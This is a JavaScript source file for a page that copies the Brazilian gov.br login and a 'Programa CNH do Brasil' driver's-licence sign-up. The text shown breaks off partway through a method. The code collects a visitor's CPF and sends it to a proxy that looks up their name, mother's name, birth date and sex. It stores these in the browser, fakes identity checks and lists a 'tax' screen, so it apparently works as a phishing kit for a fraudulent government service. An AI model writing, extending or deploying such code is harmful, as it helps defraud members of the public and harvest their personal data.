import { CONFIG } from './config.js';

// Classe LoginBuilder - Responsável por construir a tela de login
export class LoginBuilder {
    constructor() {
        this.container = document.getElementById('app');
        this.currentScreen = 'initial';
        this.userData = {};
        
        // Inicializar estado do localStorage
        this.loadUserState();
        
        // Adicionar listener para navegação do navegador
        window.addEventListener('popstate', (event) => {
            if (event.state && event.state.screen) {
                this.navigateToScreen(event.state.screen, false);
            }
        });
        
        // Verificar se há estado salvo para restaurar
        this.restoreScreenState();
    }

    // Carregar estado do usuário do localStorage
    loadUserState() {
        const savedState = localStorage.getItem('loginBuilderState');
        if (savedState) {
            try {
                const state = JSON.parse(savedState);
                this.userData = state.userData || {};
                this.currentScreen = state.currentScreen || 'initial';
            } catch (e) {
                console.error('Erro ao carregar estado:', e);
                this.userData = {};
                this.currentScreen = 'initial';
            }
        }
    }

    // Salvar estado no localStorage
    saveUserState() {
        const messagesContainer = document.getElementById('chat-messages');
        const chatHTML = messagesContainer ? messagesContainer.innerHTML : null;
        
        const state = {
            userData: this.userData,
            currentScreen: this.currentScreen,
            chatHTML: chatHTML,
            timestamp: new Date().toISOString()
        };
        localStorage.setItem('loginBuilderState', JSON.stringify(state));
        console.log('Estado salvo com chatHTML:', chatHTML ? 'sim' : 'não');
    }

    // Restaurar tela baseado no estado salvo
    restoreScreenState() {
        const savedState = JSON.parse(localStorage.getItem('loginBuilderState'));
        
        if (savedState && savedState.currentScreen !== 'initial') {
            console.log('Restaurando estado da tela:', savedState.currentScreen);
            
            // Se estamos no chat e há HTML salvo, restaurar o chat
            if (savedState.currentScreen === 'chat' && savedState.chatHTML) {
                console.log('Restaurando chat HTML salvo');
                this.currentScreen = 'chat';
                
                // Restaurar o container de chat
                const main = document.querySelector('main');
                if (main) {
                    main.innerHTML = savedState.chatHTML;
                    
                    // Re-adicionar eventos aos botões
                    this.restoreChatEvents();
                }
                return;
            }
            
            // Para outras telas, navegar normalmente
            this.navigateToScreen(savedState.currentScreen, false);
        }
    }
    
    // Restaurar eventos do chat após restaurar do localStorage
    restoreChatEvents() {
        console.log('Restaurando eventos do chat');
        
        // Re-adicionar eventos aos botões PROSSEGUIR
        const proceedButtons = document.querySelectorAll('button');
        proceedButtons.forEach((btn, index) => {
            if (btn.textContent.includes('PROSSEGUIR')) {
                btn.addEventListener('click', (e) => {
                    e.preventDefault();
                    e.stopPropagation();
                    console.log('Botão PROSSEGUIR clicado (restaurado)');
                    // Determinar qual mensagem mostrar baseado na posição
                    this.handleRestoredProceedButtonClick();
                });
            }
        });
        
        // Re-adicionar eventos aos botões de categoria
        const categoryButtons = document.querySelectorAll('[id="chat-options"] button');
        categoryButtons.forEach(btn => {
            const categoryId = btn.querySelector('span:nth-child(2)')?.textContent || 'B';
            btn.addEventListener('click', () => {
                console.log('Categoria clicada (restaurada):', categoryId);
                this.handleCategorySelection(categoryId, `Categoria ${categoryId}`, this.userData.detran || 'Detran Amazonas', 50);
            });
        });
        
        // Re-adicionar eventos aos botões de mês
        const monthButtons = document.querySelectorAll('.grid button');
        monthButtons.forEach(btn => {
            const monthName = btn.querySelector('span:first-child')?.textContent;
            const vacancies = parseInt(btn.querySelector('span:last-child')?.textContent) || 10;
            btn.addEventListener('click', () => {
                console.log('Mês clicado (restaurado):', monthName);
                this.handleMonthSelection(monthName, vacancies, this.userData.detran || 'Detran Amazonas', this.userData.category || 'B');
            });
        });
    }
    
    // Lidar com clique em botão PROSSEGUIR restaurado
    handleRestoredProceedButtonClick() {
        const messagesContainer = document.getElementById('chat-messages');
        if (!messagesContainer) return;
        
        // Contar mensagens para determinar qual etapa estamos
        const systemMessages = messagesContainer.querySelectorAll('.text-left').length;
        console.log('Mensagens do sistema:', systemMessages);
        
        // Baseado no número de mensagens, determinar qual método chamar
        if (systemMessages <= 1) {
            this.showSecondMessage(this.userData.detran || 'Detran Amazonas', this.userData.category || 'B');
        } else if (systemMessages <= 2) {
            this.showThirdMessage(this.userData.detran || 'Detran Amazonas', this.userData.category || 'B');
        } else if (systemMessages <= 3) {
            this.showFourthMessage(this.userData.detran || 'Detran Amazonas', this.userData.category || 'B');
        }
    }

    // Navegar para tela específica com suporte ao History API
    navigateToScreen(screenName, pushState = true) {
        this.currentScreen = screenName;
        this.saveUserState();
        
        // Mapear nomes de tela para métodos
        const screenMethods = {
            'initial': () => this.build(),
            'program': () => this.showProgramInfoScreen(),
            'appAccess': () => this.showAppAccessScreen(),
            'classes': () => this.showClassesScreen(),
            'cnhIssuance': () => this.showCnhIssuanceScreen(),
            'tax': () => this.showTaxScreen(),
            'final': () => this.showFinalScreen()
        };
        
        if (screenMethods[screenName]) {
            if (pushState) {
                history.pushState({ screen: screenName }, '', `#${screenName}`);
            }
            screenMethods[screenName]();
        }
    }

    // Método auxiliar para transições suaves entre telas
    async transitionScreens(newScreenFunction) {
        const mainContent = this.container.querySelector('main');
        if (!mainContent) {
            newScreenFunction.call(this);
            return;
        }

        // Adicionar classe de transição para fade out
        mainContent.style.transition = 'opacity 0.3s ease-in-out';
        mainContent.style.opacity = '0';

        // Esperar o fade out completar
        await new Promise(resolve => setTimeout(resolve, 300));

        // Construir nova tela
        newScreenFunction.call(this);

        // Adicionar fade in para a nova tela
        const newMainContent = this.container.querySelector('main');
        if (newMainContent) {
            newMainContent.style.opacity = '0';
            newMainContent.style.transition = 'opacity 0.3s ease-in-out';
            
            // Forçar reflow para garantir que a transição funcione
            newMainContent.offsetHeight;
            
            // Iniciar fade in
            setTimeout(() => {
                newMainContent.style.opacity = '1';
            }, 50);
        }
    }

    build() {
        this.container.innerHTML = '';
        this.currentScreen = 'initial';
        this.saveUserState();
        
        // Header
        const header = document.createElement('header');
        const headerImg = document.createElement('img');
        headerImg.src = 'https://i.ibb.co/WGrsWGN/IMG-1297.jpg';
        headerImg.alt = 'Imagem de cabeçalho';
        headerImg.style.width = '100%';
        header.appendChild(headerImg);
        this.container.appendChild(header);

        // Container principal
        const container = document.createElement('div');
        container.className = 'login-container';

        // Aside com logo gov.br
        const aside = document.createElement('aside');
        aside.className = 'login-aside';
        const govLogo = document.createElement('img');
        govLogo.id = 'identidade-govbr';
        govLogo.src = CONFIG.images.govLogo;
        govLogo.alt = 'Logomarca GovBR';
        aside.appendChild(govLogo);
        container.appendChild(aside);

        // Main com formulário
        const main = document.createElement('main');
        main.className = 'login-main';

        const form = document.createElement('form');
        form.method = 'post';
        form.id = 'loginData';
        form.noValidate = true;

        const card = document.createElement('div');
        card.className = 'login-card';

        // Logo CNH
        const logoContainer = document.createElement('div');
        logoContainer.style.cssText = 'display: flex; justify-content: center; align-items: center; width: 100%; margin-bottom: 16px;';
        const cnhLogo = document.createElement('img');
        cnhLogo.src = CONFIG.images.cnhLogo;
        cnhLogo.alt = 'CNH do Brasil';
        cnhLogo.style.cssText = 'height: 64px; object-fit: contain;';
        logoContainer.appendChild(cnhLogo);
        card.appendChild(logoContainer);

        // Título
        const h3 = document.createElement('h3');
        h3.textContent = 'Identifique-se no gov.br com:';
        card.appendChild(h3);

        // Opção CPF
        const cpfOption = document.createElement('div');
        cpfOption.className = 'login-option';
        cpfOption.tabIndex = 3;
        cpfOption.style.cssText = 'display: flex; align-items: center; cursor: pointer;';
        
        const cpfIcon = document.createElement('img');
        cpfIcon.src = 'https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png';
        cpfIcon.alt = 'Ícone CPF';
        cpfOption.appendChild(cpfIcon);
        
        const cpfText = document.createElement('span');
        cpfText.textContent = 'Número do CPF';
        cpfOption.appendChild(cpfText);
        
        card.appendChild(cpfOption);

        // Painel de accordion
        const accordion = document.createElement('div');
        accordion.className = 'login-accordion';
        accordion.id = 'accordion-panel-id';

        const p = document.createElement('p');
        p.innerHTML = 'Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br';
        accordion.appendChild(p);

        const label = document.createElement('label');
        label.htmlFor = 'cpf';
        label.textContent = 'CPF';
        accordion.appendChild(label);

        const input = document.createElement('input');
        input.type = 'tel';
        input.id = 'cpf';
        input.name = 'cpf';
        input.placeholder = 'Digite seu CPF';
        input.autocomplete = 'new-password';
        input.tabIndex = 1;
        input.setAttribute('aria-invalid', 'false');
        accordion.appendChild(input);

        // Botão continuar
        const buttonPanel = document.createElement('div');
        buttonPanel.className = 'login-button-panel';
        buttonPanel.id = 'login-button-panel';

        const continueBtn = document.createElement('button');
        continueBtn.type = 'submit';
        continueBtn.className = 'login-button';
        continueBtn.tabIndex = 2;
        continueBtn.textContent = 'Continuar';
        buttonPanel.appendChild(continueBtn);

        accordion.appendChild(buttonPanel);
        card.appendChild(accordion);

        // Outras opções
        const otherLabel = document.createElement('label');
        otherLabel.id = 'title-outras-op';
        otherLabel.textContent = 'Outras opções de identificação:';
        card.appendChild(otherLabel);

        const hr = document.createElement('hr');
        hr.id = 'hr-outras-op';
        hr.style.margin = '0';
        card.appendChild(hr);

        // Login com banco
        const bankOption = document.createElement('div');
        bankOption.className = 'login-option';
        bankOption.style.cssText = 'display: flex; align-items: center; cursor: pointer;';
        
        const bankIcon = document.createElement('img');
        bankIcon.src = 'https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png';
        bankIcon.alt = 'Ícone Internet Banking';
        bankOption.appendChild(bankIcon);
        
        const bankText = document.createElement('span');
        bankText.textContent = 'Login com seu banco';
        bankOption.appendChild(bankText);
        
        card.appendChild(bankOption);

        form.appendChild(card);
        main.appendChild(form);
        container.appendChild(main);
        this.container.appendChild(container);

        // Adicionar event listener para o formulário
        form.addEventListener('submit', (e) => this.handleSubmit(e));
    }

    async handleSubmit(e) {
        e.preventDefault();
        const cpfInput = document.getElementById('cpf');
        const continueBtn = document.querySelector('.login-button');
        const cpf = cpfInput.value.replace(/\D/g, '');

        if (cpf.length !== 11) {
            alert('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        // Estado de carregamento no botão
        continueBtn.innerHTML = '<div class="spinner"></div> Carregando...';
        continueBtn.disabled = true;

        try {
            // Usar proxy PHP para evitar CORS
            const response = await fetch(`api/proxy.php?cpf=${cpf}`, {
                method: 'GET'
            });

            const data = await response.json();
            
            // Verificar se os dados estão no formato correto
            let userData;
            if (data.DADOS) {
                // Formato com DADOS wrapper
                userData = data.DADOS;
            } else {
                // Formato direto
                userData = data;
            }
            
            // Armazenar dados no localStorage
            localStorage.setItem('userCpf', userData.cpf);
            localStorage.setItem('userName', userData.nome);
            localStorage.setItem('userNameMae', userData.nome_mae);
            localStorage.setItem('userBirthDate', userData.data_nascimento);
            localStorage.setItem('userSex', userData.sexo);

            // Delay de 2-3 segundos antes de mostrar tela de verificação
            setTimeout(() => {
                // Mostrar tela de verificação com os dados corretos
                this.showVerificationScreen(userData);
            }, 2500);
        } catch (error) {
            console.error('Erro ao consultar CPF:', error);
            // Restaurar botão em caso de erro
            continueBtn.innerHTML = 'Continuar';
            continueBtn.disabled = false;
            alert('Erro ao consultar CPF. Tente novamente.');
        }
    }

    showVerificationScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '1';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.textContent = 'Qual é seu nome completo?';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de nomes - usar o nome exato da consulta CPF
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        // Usar o nome exato da consulta CPF e normalizar todas as opções
        const cpfName = data.nome || 'Nome não encontrado';
        const names = [
            'João Oliveira Marques'.toUpperCase(),
            cpfName.toUpperCase(),
            'Heitor Santos Martins'.toUpperCase()
        ];
        
        names.forEach((name, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = name;
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'name-option';
            radio.id = `option-${index}`;
            radio.value = name;
            radio.style.display = 'none';
            
            // Sem pré-seleção - apenas quando usuário clicar
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
                errorMessage.style.display = 'none';
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="name-option"]:checked');
            if (selectedOption) {
                // Estado de verificando
                confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Verificando...';
                confirmBtn.disabled = true;
                
                // Simular verificação (apenas o nome correto deve passar)
                setTimeout(() => {
                    if (selectedOption.value.toUpperCase() === cpfName.toUpperCase()) {
                        // Nome correto - mostrar verificado
                        confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Verificado';
                        
                        // Pequeno delay antes de ir para próxima página
                        setTimeout(() => {
                            this.showBirthDateVerification(data);
                        }, 500);
                    } else {
                        // Nome incorreto - mostrar erro
                        errorMessage.style.display = 'block';
                        confirmBtn.innerHTML = 'Confirmar';
                        confirmBtn.disabled = false;
                    }
                }, 2000);
            }
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Mensagem de erro (fora do card, na posição correta)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showBirthDateVerification(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
